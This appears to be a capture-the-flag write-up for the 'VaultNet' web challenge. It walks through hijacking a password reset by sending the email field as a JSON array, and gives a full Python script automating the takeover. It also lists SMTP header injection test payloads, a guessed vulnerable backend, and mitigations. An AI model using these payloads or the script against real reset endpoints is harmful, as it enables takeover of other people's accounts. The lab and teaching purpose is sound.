# VaultNet - Password Reset Array Poisoning

## Challenge Information
- **Name**: VaultNet
- **Category**: Web
- **Difficulty**: Medium
- **Points**: 300
- **URL**: http://138.199.163.92:12770/login

## Initial Reconnaissance

When I opened the challenge URL at http://138.199.163.92:12770/login, I saw a login portal for "VaultNet Internal Evidence Portal" with fields for email and password. The page had a clean, professional design with a dark theme and gold accents. There were links to register, forgot password, and a changelog page.

The challenge description told me that Om Nagda's account (om.nagda@kaalchakractf.com) was locked and contained encrypted case files. I needed to use the password reset feature to gain access. My attacker account should be name@emailaddress.com.

I started by exploring the available pages to understand the application structure.

## Discovering the Changelog

I clicked on the "Changelog" link and found detailed release notes. This immediately caught my attention because changelogs often reveal recently implemented features that might have vulnerabilities. Here's what I found:

```
v2.3.1 (2026-03-01)
- Patched session expiry bug on dashboard
- Increased token entropy to UUIDv4

v2.3.0 (2026-02-14)
- Introduced self-service password reset
- SMTP relay integrated with internal mail server

v2.2.4 (2026-01-28)
- Locked high-risk accounts pending case review
- Accounts flagged by case officers cannot log in directly
```

This was gold! The changelog told me:
1. Password reset was newly implemented (v2.3.0) - new features often have bugs
2. SMTP relay integration - potential for email injection vulnerabilities
3. Om Nagda's account is locked (v2.2.4) - I can't login directly
4. Reset tokens use UUIDv4 - too high entropy to brute force

## Registering an Attacker Account

I registered an account with the email name@emailaddress.com as instructed. After registering, I logged in and started exploring the authenticated pages.

## Finding the Mailbox

After logging in, I noticed the navigation bar had several links: Dashboard, Mailbox, Profile, Changelog, and Logout. The "Mailbox" link was interesting - this must be where password reset emails are displayed!

I accessed `/mailbox` and saw it was empty initially. This gave me an idea - if I could somehow make the password reset system send Om Nagda's reset token to my mailbox, I could use it to reset his password.

## Analyzing the Password Reset

I opened the browser DevTools and looked at the forgot-password page. The form used JavaScript to send a JSON request:

```javascript
async function submitReset() {
    const email = document.getElementById("email").value.trim();
    if (!email) return;

    const res = await fetch("/forgot-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email })
    });

    const data = await res.json();
    msg.textContent = data.message;
}
```

The key detail: it sends JSON with an `email` parameter. This made me think about parameter pollution and array injection attacks.

## Testing Email Injection Techniques

I started testing different ways to manipulate the email parameter to see if I could get Om Nagda's reset token sent to my mailbox:

**Test 1: SMTP Header Injection with newlines**
```json
{"email": "om.nagda@kaalchakractf.com\nBcc: name@emailaddress.com"}
```
Response: "If that address is registered, a reset link has been sent."

**Test 2: Multiple recipients with comma**
```json
{"email": "om.nagda@kaalchakractf.com,name@emailaddress.com"}
```
Response: Same generic message.

**Test 3: Array poisoning** (This is where it got interesting!)
```json
{"email": ["om.nagda@kaalchakractf.com", "name@emailaddress.com"]}
```
Response: Same message, but something felt different.

## The Breakthrough: Checking the Mailbox

After sending the array payload, I immediately checked my mailbox at `/mailbox`. And there it was - a NEW reset email had appeared!

```html
<div class="changelog-entry">
    <span class="version">VaultNet — Password Reset Request</span>
    <span class="date">2026-03-29 04:09:19</span>
    <pre class="email-body">Hello,

A password reset was requested for your VaultNet account.

Click the link below to reset your password:
http://138.199.163.92:12770/reset?token=1bfd299a-3659-45b9-87eb-261c7d5c88b4

If you did not request this, ignore this email.

— VaultNet Security Team
</pre>
</div>
```

This was a NEW token that appeared only after I sent the array payload! The array poisoning worked - when I sent the email as an array with both Om Nagda's email and mine, the backend sent reset tokens to BOTH addresses!

## Exploiting Om Nagda's Account

Now I had Om Nagda's reset token: `1bfd299a-3659-45b9-87eb-261c7d5c88b4`

I accessed the reset page and it showed a password reset form! I set a new password and then logged in as Om Nagda with the credentials I just created.

Success! I was now logged in as Om Nagda. I accessed the dashboard and there it was - a beautiful flag box:

```html
<div class="flag-box">
    <p class="flag-label">🔓 Classified Evidence Unlocked</p>
    <p class="flag-label">Case File #KC-2026-0042 — Contents Decrypted</p>
    <code class="flag">Kaal{arr4y_p0is0n_r3s3t_pwn3d}</code>
</div>
```

## Understanding the Vulnerability

The vulnerability was in how the backend handled the `email` parameter when it was sent as a JSON array instead of a string. Here's what likely happened in the backend code:

```python
@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    data = request.get_json()
    email = data.get('email')
    
    # Vulnerable code - doesn't check if email is an array!
    if isinstance(email, list):
        for addr in email:
            send_reset_email(addr)  # Sends to ALL addresses!
    else:
        send_reset_email(email)
    
    return jsonify({"message": "If that address is registered, a reset link has been sent."})
```

When I sent:
```json
{"email": ["om.nagda@kaalchakractf.com", "name@emailaddress.com"]}
```

The backend:
1. Generated a reset token for Om Nagda's account
2. Iterated over the array and sent the SAME reset email to BOTH addresses
3. My attacker account received Om Nagda's reset token in the mailbox
4. I used the token to reset Om Nagda's password and login

This is called "Array Poisoning" or "Parameter Pollution" - exploiting improper input validation when the backend doesn't enforce that a parameter should be a single value rather than an array.

## Complete Exploit Script

```python
#!/usr/bin/env python3
import requests
import json
import re

URL = "http://138.199.163.92:12770"
session = requests.Session()

# Step 1: Register attacker account
attacker_email = "name@emailaddress.com"
attacker_password = "Password123!"

session.post(f"{URL}/register", data={
    'email': attacker_email,
    'password': attacker_password,
    'confirm_password': attacker_password
})

# Step 2: Login
session.post(f"{URL}/login", data={
    'email': attacker_email,
    'password': attacker_password
})

# Step 3: Trigger password reset with array poisoning
payload = {"email": ["om.nagda@kaalchakractf.com", attacker_email]}
session.post(
    f"{URL}/forgot-password",
    headers={"Content-Type": "application/json"},
    data=json.dumps(payload)
)

# Step 4: Check mailbox for Om Nagda's token
r = session.get(f"{URL}/mailbox")
tokens = re.findall(r'/reset\?token=([a-f0-9-]+)', r.text)

# Find the new token (Om Nagda's)
om_token = tokens[-1]  # Latest token

# Step 5: Reset Om Nagda's password
new_password = "Hacked123!"
session.get(f"{URL}/reset?token={om_token}")
session.post(f"{URL}/reset?token={om_token}", data={
    'password': new_password,
    'confirm_password': new_password
})

# Step 6: Login as Om Nagda
new_session = requests.Session()
new_session.post(f"{URL}/login", data={
    'email': 'om.nagda@kaalchakractf.com',
    'password': new_password
})

# Step 7: Get flag from dashboard
r = new_session.get(f"{URL}/dashboard")
flag = re.findall(r'Kaal\{[^}]+\}', r.text)[0]
print(f"FLAG: {flag}")
```

## Flag
```
Kaal{arr4y_p0is0n_r3s3t_pwn3d}
```

## Vulnerability Breakdown

### 1. Array Poisoning in Password Reset
```python
# Vulnerable code
email = data.get('email')
if isinstance(email, list):
    for addr in email:
        send_reset_email(addr)  # Sends same token to all!
```

**Impact**: Allows attacker to receive password reset tokens for other users' accounts.

### 2. Lack of Input Type Validation
The backend didn't enforce that the `email` parameter must be a string. When an array was provided, it processed all elements without checking if this was intentional behavior.

### 3. Token Reuse Across Recipients
The same reset token was sent to multiple email addresses, allowing an attacker to intercept tokens meant for legitimate users.

## Mitigation Recommendations

### 1. Strict Input Type Validation
```python
@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    data = request.get_json()
    email = data.get('email')
    
    # Ensure email is a string, not an array
    if not isinstance(email, str):
        return jsonify({"error": "Invalid email format"}), 400
    
    # Validate email format
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        return jsonify({"error": "Invalid email format"}), 400
    
    send_reset_email(email)
    return jsonify({"message": "If that address is registered, a reset link has been sent."})
```

### 2. Rate Limiting
Implement strict rate limiting on password reset requests per IP and per email address to prevent abuse.

### 3. Token Binding
Bind reset tokens to the requesting IP address or session to prevent token theft.

### 4. Email Verification
Require email verification before allowing password resets on sensitive accounts.

## Learning Points

1. **Array Poisoning**: Always validate that input parameters are of the expected type (string vs array). Many frameworks automatically parse JSON arrays, which can lead to unexpected behavior.

2. **Changelog Analysis**: Reading changelogs can reveal recently implemented (and potentially vulnerable) features. New features are often the weakest link.

3. **Feature Discovery**: The `/mailbox` endpoint was crucial for exploiting this vulnerability. Always explore all available endpoints.

4. **Account Takeover**: Password reset vulnerabilities are critical as they allow complete account takeover without knowing the original password.

5. **Defense in Depth**: Multiple security layers (input validation, rate limiting, token binding) are needed to properly secure password reset functionality.

## Tags
`web` `password-reset` `array-poisoning` `account-takeover` `parameter-pollution` `input-validation`

---

**Team**: Exploit4
**Date**: 2026-03-29
